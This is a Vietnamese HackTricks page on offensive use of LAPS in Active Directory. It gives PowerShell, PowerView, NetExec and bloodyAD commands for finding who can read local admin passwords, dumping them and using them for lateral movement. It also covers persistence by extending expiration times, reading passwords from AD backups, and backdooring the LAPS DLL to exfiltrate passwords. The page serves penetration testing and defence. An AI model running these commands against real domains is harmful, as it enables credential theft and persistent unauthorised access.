# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Thông tin cơ bản

Hiện có **2 biến thể LAPS** bạn có thể gặp trong quá trình đánh giá:

- **Legacy Microsoft LAPS**: lưu mật khẩu quản trị viên cục bộ trong **`ms-Mcs-AdmPwd`** và thời điểm hết hạn trong **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (được tích hợp trong Windows từ các bản cập nhật tháng 4 năm 2023): vẫn có thể mô phỏng chế độ legacy, nhưng ở chế độ native sẽ sử dụng các thuộc tính **`msLAPS-*`**, hỗ trợ **mã hóa mật khẩu**, **lịch sử mật khẩu** và **sao lưu mật khẩu DSRM** cho domain controller.

LAPS được thiết kế để quản lý **mật khẩu quản trị viên cục bộ**, giúp mật khẩu **duy nhất, được tạo ngẫu nhiên và thường xuyên thay đổi** trên các máy tính tham gia domain. Nếu bạn có thể đọc các thuộc tính đó, thường thì bạn có thể **pivot với quyền local admin** sang host bị ảnh hưởng. Trong nhiều môi trường, điều đáng chú ý không chỉ là đọc được mật khẩu, mà còn là tìm ra **ai được ủy quyền truy cập** các thuộc tính mật khẩu.

### Các thuộc tính của Legacy Microsoft LAPS

Trong các computer object của domain, việc triển khai Legacy Microsoft LAPS sẽ thêm hai thuộc tính:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **mật khẩu quản trị viên dạng văn bản thuần**
- **`ms-Mcs-AdmPwdExpirationTime`**: **thời điểm hết hạn mật khẩu**

### Các thuộc tính của Windows LAPS

Windows LAPS native bổ sung một số thuộc tính mới cho computer object:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: blob mật khẩu dạng văn bản thuần được lưu dưới dạng JSON khi chưa bật mã hóa
- **`msLAPS-PasswordExpirationTime`**: thời điểm hết hạn theo lịch
- **`msLAPS-EncryptedPassword`**: mật khẩu hiện tại đã mã hóa
- **`msLAPS-EncryptedPasswordHistory`**: lịch sử mật khẩu đã mã hóa
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: dữ liệu mật khẩu DSRM đã mã hóa dành cho domain controller
- **`msLAPS-CurrentPasswordVersion`**: theo dõi phiên bản dựa trên GUID, được dùng trong logic phát hiện rollback mới hơn (schema forest Windows Server 2025)

Khi có thể đọc **`msLAPS-Password`**, giá trị này là một đối tượng JSON chứa tên tài khoản, thời gian cập nhật và mật khẩu dạng văn bản thuần, ví dụ:<sup>[[2]](#references)</sup>

```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```

### Kiểm tra trạng thái kích hoạt

```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
  ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
  select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
  select DnsHostname
```

## Truy cập mật khẩu LAPS

Bạn có thể **tải xuống policy LAPS thô** từ `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, sau đó dùng **`Parse-PolFile`** từ package [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) để chuyển đổi tệp này sang định dạng dễ đọc.

### Các cmdlet PowerShell của Microsoft LAPS cũ

Nếu module LAPS cũ đã được cài đặt, các cmdlet sau thường khả dụng:

```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```

### Các cmdlet PowerShell của Windows LAPS

Windows LAPS tích hợp sẵn đi kèm với một module PowerShell mới và các cmdlet mới:

```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```

Một vài chi tiết vận hành cần lưu ý:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** tự động xử lý **legacy LAPS**, **clear-text Windows LAPS** và **encrypted Windows LAPS**.
- Nếu mật khẩu được mã hóa và bạn có thể **đọc** nhưng không thể **giải mã**, cmdlet sẽ trả về metadata như **`Source`**, **`DecryptionStatus`** và **`AuthorizedDecryptor`** ngay cả khi không thể trả về mật khẩu dạng clear-text.
- Trong **encrypted Windows LAPS**, **quyền đọc** và **quyền giải mã** là **hai quyền kiểm soát khác nhau**. Có quyền đọc OU / object không đồng nghĩa với việc bạn có thể giải mã **`msLAPS-EncryptedPassword`**.
- **Lịch sử mật khẩu** chỉ khả dụng khi bật **mã hóa Windows LAPS**.
- Trên domain controller, source được trả về có thể là **`EncryptedDSRMPassword`**.

Điều này hữu ích trong quá trình đánh giá vì trường **`AuthorizedDecryptor`** cho biết **blob được mã hóa cho user hoặc group nào**, thường biến một lần đọc mật khẩu thất bại thành mục tiêu leo thang đặc quyền mới.

### PowerView / LDAP

Bạn cũng có thể dùng **PowerView** để tìm hiểu **ai có thể đọc mật khẩu và đọc mật khẩu đó**:

```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```

Nếu có thể đọc **`msLAPS-Password`**, hãy phân tích JSON được trả về và trích xuất **`p`** làm mật khẩu và **`n`** làm tên tài khoản quản trị viên cục bộ được quản lý.

```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```

Trường **`n`** đó rất quan trọng trên các triển khai mới hơn vì **Windows LAPS automatic account management** có thể nhắm đến một **tài khoản tùy chỉnh** thay vì **`Administrator`** tích hợp sẵn, và các hệ thống **Windows 11 24H2 / Windows Server 2025** mới hơn thậm chí có thể **ngẫu nhiên hóa** tên tài khoản đó.<sup>[[4]](#references)</sup>

### Linux / công cụ từ xa

Các công cụ hiện đại hỗ trợ cả Microsoft LAPS cũ và Windows LAPS.

```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
  get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
  --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

Ghi chú:

- Các bản dựng **NetExec** gần đây hỗ trợ **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** và **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** vẫn hữu ích để dùng **Microsoft LAPS đời cũ** từ Linux, nhưng chỉ nhắm đến **`ms-Mcs-AdmPwd`**.
- Các công cụ đa nền tảng mới hơn như **`LAPS4LINUX`**, công cụ dựa trên **`dpapi-ng`** và quy trình **NetExec** gần đây cũng có thể xử lý **Windows LAPS nguyên bản** từ các host không chạy Windows.
- Nếu môi trường sử dụng **Windows LAPS được mã hóa**, chỉ đọc LDAP là chưa đủ; bạn cũng cần là **decryptor được ủy quyền** (hoặc có vật liệu giải mã tương đương, chẳng hạn vật liệu khóa gốc DPAPI-NG của domain ngoại tuyến).<sup>[[5]](#references)</sup>
- Trên **Windows 11 24H2 / Windows Server 2025**, đừng mặc định rằng tài khoản admin cục bộ được quản lý luôn là **`Administrator`**. Tính năng quản lý tài khoản tự động có thể tạo tài khoản tùy chỉnh và tùy chọn ngẫu nhiên hóa tên tài khoản, vì vậy hãy tìm tên tài khoản trước bằng **`n`** / **`Account`** rồi mới dùng **`--laps`** trên diện rộng.<sup>[[4]](#references)</sup>

### Lạm dụng quyền đồng bộ thư mục

Nếu bạn có quyền **đồng bộ thư mục** ở cấp domain thay vì quyền đọc trực tiếp trên từng computer object, LAPS vẫn có thể đáng quan tâm.

Kết hợp **`DS-Replication-Get-Changes`** với **`DS-Replication-Get-Changes-In-Filtered-Set`** hoặc **`DS-Replication-Get-Changes-All`** có thể được dùng để đồng bộ các thuộc tính **confidential / được RODC lọc**, chẳng hạn **`ms-Mcs-AdmPwd`** đời cũ. BloodHound mô hình hóa quyền này thành **`SyncLAPSPassword`**. Xem [DCSync](dcsync.md) để tìm hiểu về các quyền replication.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) hỗ trợ liệt kê LAPS bằng một số chức năng.<sup>[[6]](#references)</sup>\
Một chức năng là phân tích **`ExtendedRights`** của **tất cả máy tính đã bật LAPS.** Chức năng này cho biết cụ thể **các nhóm** được **ủy quyền đọc mật khẩu LAPS**, thường là người dùng thuộc các nhóm được bảo vệ.\
Một **account** đã **join máy tính** vào domain sẽ nhận được `All Extended Rights` trên host đó; quyền này cho phép **account** **đọc mật khẩu**. Kết quả liệt kê có thể cho thấy một user account có thể đọc mật khẩu LAPS trên một host. Điều này có thể giúp chúng ta **nhắm mục tiêu các user AD cụ thể** có thể đọc mật khẩu LAPS.

```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```

## Dumping mật khẩu LAPS bằng NetExec / CrackMapExec

Nếu bạn không có PowerShell tương tác, bạn có thể khai thác quyền này từ xa qua LDAP:

```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```

Lệnh này trích xuất tất cả bí mật LAPS mà người dùng có thể đọc, cho phép bạn move laterally bằng một mật khẩu quản trị viên cục bộ khác.

## Sử dụng mật khẩu LAPS

```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```

## LAPS Persistence

### Expiration Date

Khi đã có quyền admin, có thể **lấy mật khẩu** và **ngăn** máy tính **cập nhật** **mật khẩu** bằng cách **đặt ngày hết hạn thành một thời điểm trong tương lai**.

Legacy Microsoft LAPS:

```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

Windows LAPS tích hợp sẵn sử dụng **`msLAPS-PasswordExpirationTime`** thay vào đó:

```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```

> [!WARNING]
> Mật khẩu vẫn sẽ được xoay vòng nếu một **admin** sử dụng **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, hoặc nếu bật tùy chọn **Do not allow password expiration time longer than required by policy**.

### Lưu ý về việc khôi phục snapshot trên các phiên bản Windows LAPS mới hơn

Các thủ thuật khôi phục snapshot / image cũ **kém tin cậy hơn** khi đối phó với các triển khai **Windows LAPS** gần đây. Trên **Windows 11 24H2 / Windows Server 2025**, nếu schema forest có **`msLAPS-CurrentPasswordVersion`** (**schema forest Windows Server 2025**), client sẽ so sánh GUID được lưu trong bộ nhớ đệm cục bộ với giá trị lưu trong AD và **xoay vòng mật khẩu ngay lập tức** khi thao tác khôi phục tạo ra **trạng thái không nhất quán**.

Trên thực tế, điều này có nghĩa là persistence dựa trên snapshot hoặc các nỗ lực khôi phục mật khẩu admin cục bộ cũ đã biết có thể bị vô hiệu nhanh chóng, thay vì tồn tại đến lần hết hạn thông thường tiếp theo.<sup>[[2]](#references)</sup>

Biện pháp bảo vệ này chỉ áp dụng cho **Windows LAPS dựa trên AD** và vẫn phụ thuộc vào việc máy đã khôi phục có thể **xác thực lại với AD** hay không. Nếu máy không còn kết nối được với AD, **lịch sử mật khẩu** hoặc **quyền truy cập vào bản sao lưu AD** vẫn có thể hữu ích.

### Lưu ý về việc can thiệp vào quản lý tài khoản tự động

Khi bật **quản lý tài khoản tự động**, Windows LAPS quản lý vòng đời của tài khoản admin cục bộ được quản lý. Các nỗ lực bất ngờ nhằm đổi tên, cấu hình lại hoặc can thiệp theo cách khác vào tài khoản đó có thể bị từ chối với mã **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, vì vậy persistence dựa vào việc âm thầm sửa đổi tài khoản LAPS được quản lý sẽ kém tin cậy hơn trên các endpoint mới hơn.<sup>[[4]](#references)</sup>

### Khôi phục mật khẩu cũ từ bản sao lưu AD

Khi bật **mã hóa Windows LAPS + lịch sử mật khẩu**, các bản sao lưu AD đã mount có thể trở thành một nguồn bí mật bổ sung. Nếu có thể truy cập snapshot AD đã mount và sử dụng **chế độ khôi phục**, bạn có thể truy vấn các mật khẩu cũ đã lưu mà không cần kết nối với DC đang hoạt động.<sup>[[3]](#references)</sup>

```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```

Phần này chủ yếu liên quan đến **đánh cắp bản sao lưu AD**, **lạm dụng phân tích pháp chứng ngoại tuyến** hoặc **truy cập phương tiện khôi phục sau thảm họa**.

### Backdoor

Có thể tìm thấy mã nguồn ban đầu của Microsoft LAPS cũ [tại đây](https://github.com/GreyCorbel/admpwd), do đó có thể cài backdoor vào mã (chẳng hạn bên trong phương thức `Get-AdmPwdPassword` trong `Main/AdmPwd.PS/Main.cs`) để **exfiltrate mật khẩu mới hoặc lưu chúng ở đâu đó**.

Sau đó, biên dịch `AdmPwd.PS.dll` mới và tải nó lên máy tại `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (đồng thời thay đổi thời gian sửa đổi).

## References

- [1] [Giới thiệu về Microsoft LAPS – Giải pháp mật khẩu quản trị viên cục bộ](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Lược đồ Windows LAPS và các phần mở rộng quyền cho Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Bắt đầu với Windows LAPS và Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Các chế độ quản lý tài khoản Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - Blog XPN Infosec](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)
{{#include ../../banners/hacktricks-training.md}}
